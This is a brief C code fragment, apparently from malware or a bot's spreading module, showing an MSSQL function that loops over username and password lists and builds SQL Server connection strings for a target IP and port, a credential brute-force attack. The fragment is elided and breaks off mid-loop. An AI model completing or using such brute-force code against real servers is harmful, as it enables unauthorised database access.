...
void MSSQL(exparam_s exparam)
{
	...
	for (int i=0; users[i]; i++) {
		for (int j=0; password[j]; j++) {
			sprintf((char *)constr, "DRIVER={SQL Server};SERVER=%s,%d;UID=%s;PWD=%s;%s",exparam.ip,exparam.port,users[i],password[j],database);
